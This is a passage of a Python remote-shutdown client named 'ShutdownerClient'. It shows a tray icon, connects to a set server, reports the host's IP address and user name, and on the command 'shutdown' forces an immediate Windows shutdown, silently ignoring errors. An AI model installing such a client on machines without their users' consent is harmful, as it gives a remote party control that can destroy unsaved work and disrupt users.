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"
    source=BytesIO(base64.b64decode(base64_image))
    icon=pystray.Icon("ShutdownerClient", title="ShutdownerClient")
    icon.icon=Image.open(source)
    icon.run()

Thread(target=Icon).start()

while True:
    try:
        client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        icon.title="Connected"
        print(client.recv(1024).decode())
        client.send(myip.encode())
        print(client.recv(1024).decode())
        client.send(user.encode())
        while True:
            try:
                msg=client.recv(1024).decode()
                if msg == "ping":
                    client.send("pong".encode())
                elif msg == "shutdown":
                    client.send("shutdowning...".encode())
                    client.close()
                    os.system(r'shutdown -s -f -t 00')
                    time.sleep(5)
                    break
                else:
                    raise ConnectionRefusedError
                    break
            except:
                break
                raise ConnectionRefusedError
    except TimeoutError:
        pass
    except ConnectionRefusedError:
        pass
    except OSError:
        pass
    except WindowsError:
        pass
    except Exception:
        pass
    finally:
        icon.title="Finding connection..."
        client.close()
